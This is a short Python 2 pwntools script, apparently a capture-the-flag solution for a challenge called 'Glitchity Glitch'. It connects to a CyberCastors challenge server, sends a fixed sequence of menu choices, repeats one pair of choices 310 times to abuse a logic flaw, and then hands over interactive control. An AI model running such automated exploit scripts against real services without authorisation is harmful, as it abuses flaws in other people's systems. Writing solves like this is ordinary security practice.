#Glitchity Glitch 
from pwn import *

conn=remote("chals20.cybercastors.com", 14432)

print conn.recvuntil("Choice: ")

conn.sendline("6")
print conn.recvuntil("Choice: ")

conn.sendline("0")

print conn.recvuntil("Choice: ")

conn.sendline("1")

print conn.recvuntil("Choice: ")

conn.sendline("0")

print conn.recvuntil("Choice: ")

conn.sendline("1")

s=1
for x in range(310):
    print conn.recvuntil("Choice: ")

    conn.sendline("0")

    print conn.recvuntil("Choice: ")
    s=1+s
    print s
    conn.sendline("1")
conn.interactive()
